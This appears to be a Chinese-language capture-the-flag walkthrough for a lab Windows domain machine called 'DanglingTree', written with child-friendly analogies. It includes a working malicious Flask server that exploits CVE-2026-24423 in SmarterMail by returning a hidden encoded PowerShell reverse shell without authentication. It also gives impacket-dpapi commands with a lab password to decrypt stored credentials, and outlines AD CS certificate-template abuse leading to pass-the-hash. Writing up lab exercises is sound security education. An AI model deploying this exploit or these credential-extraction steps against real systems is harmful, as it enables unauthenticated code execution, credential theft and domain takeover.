🧒 CVE-2026-24423 儿童版：快递骗局 SmarterMail 有个「连接到总部」的功能。你告诉它「总部地址是我的攻击机」，它就会主动来找你。你在攻击机上开一个假的「总部」（Flask 服务器），当 SmarterMail 来问「总部你要我干啥」的时候，你回答「执行这个 PowerShell 反向 Shell」，它就乖乖执行了。整个过程不需要登录。

恶意 Flask 服务器 hub.py

from flask import Flask, request, jsonify
import uuid

app = Flask(__name__)
PAYLOAD = "powershell -nop -w hidden -enc <BASE64_ENCODED_SHELL>"
counter = 0

@app.route('/web/api/node-management/setup-initial-connection', methods=['POST'])
def hub():
    global counter
    counter += 1
    mount_path = f"C:\\Windows\\Temp\\mnt{counter}"
    response = {
        "ClusterID": str(uuid.uuid4()),
        "SharedSecret": str(uuid.uuid4()),
        "TargetHubs": {"a": "b"},
        "IsStandby": False,
        "SystemMount": {
            "Enabled": True,
            "ReadOnly": False,
            "MountPath": mount_path,
            "CommandMount": PAYLOAD,
            "UseArgumentsInCommand": False
        },
        "SystemAdminUsernames": ["admin"]
    }
    return jsonify(response)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8081)

🧒 DPAPI 儿童版：保险箱套保险箱 DPAPI 是 Windows 的密码保险箱。用户保存的密码不是明文存的，而是用一把「主钥匙」（Master Key）加密的。这把主钥匙本身又用用户的登录密码加密。解密过程就是两步开锁：先用 noah.b 的密码解开 Master Key，再用 Master Key 解开 Credential Blob，拿到 alex.o 的明文密码。 
# 解密 Master Key
$ impacket-dpapi masterkey \
  -file f53fcaba-f057-48e8-8f92-0180d274bf0f \
  -sid S-1-5-21-4220238332-57023728-1129110646-1602 \
  -password 'RiverDragon#Storm25'

# 用 Master Key 解密 Credential Blob
$ impacket-dpapi credential \
  -file 57FFB67D684C67F09E7153B9C7CC3940 \
  -key '<MASTER_KEY>'

Phase 6

AD CS 证书模板滥用 — 获取 Administrator

🧒 伪造毕业证 把 AD CS 想象成一个大学的教务处（CA = Certificate Authority）。教务处按照课程模板（Certificate Template）发毕业证。正常情况下，模板规定「只有本校学生能申请」、「毕业证上的名字必须是你自己」。我们的做法：jake.h 有权限创建新的课程模板 → 设置「允许申请人自己填名字」（ENROLLEE_SUPPLIES_SUBJECT）→ 申请毕业证但名字填 Administrator → 教务处没验证名字，直接发了证书 → 拿着这张「Administrator 的毕业证」去认证 → NTLM hash → Pass-the-Hash → SYSTEM。

「DanglingTree」机器名含义：枚举 AD CS 时发现了 16 个 issuance policy OID，但有 3 个没有对应的模板——模板被删了但 OID 还残留在 LDAP 里，像树上挂着的断枝（dangling = 悬挂/残留）。这些悬空 OID 是提示你往 AD CS 方向看的关键线索。

知识点总结

SMB 匿名枚举仍然有效。

IT 共享里的 RoE 文档直接泄露了渗透测试凭据。始终检查匿名可读的共享。

Windows Admin Center 的 API 可被滥用。

WAC 的 PowerShell invokeCommand 端点在获取合法凭据后可直接执行命令。保留完整 Cookie 和 XSRF Token 是关键。

CVE-2026-24423 是零认证 RCE。

SmarterMail 的「连接到总部」功能不验证对方身份。搭建假 Hub 服务器 → 投递命令 → 获取 Shell。

DPAPI 是 Windows 凭据提取的核心技术。

两步解密：用户密码 → Master Key → Credential Blob → 明文密码。impacket-dpapi 工具链完整支持。

ForceChangePassword 是 AD 横向移动的常见路径。

BloodHound 中查找这条边。强制改密码不需要知道原密码，只需要组权限。

AD CS 恶意模板创建是高级域提权。

关键设置：ENROLLEE_SUPPLIES_SUBJECT（允许自填主题）+ Client Authentication EKU。配合 certipy 申请 Admin 证书 → NTLM hash → PtH。

悬空 OID 是 AD CS 攻击的线索。

模板被删但 OID 残留在 LDAP 中（flags=1 且无 displayName）。机器名 DanglingTree 就是暗示。
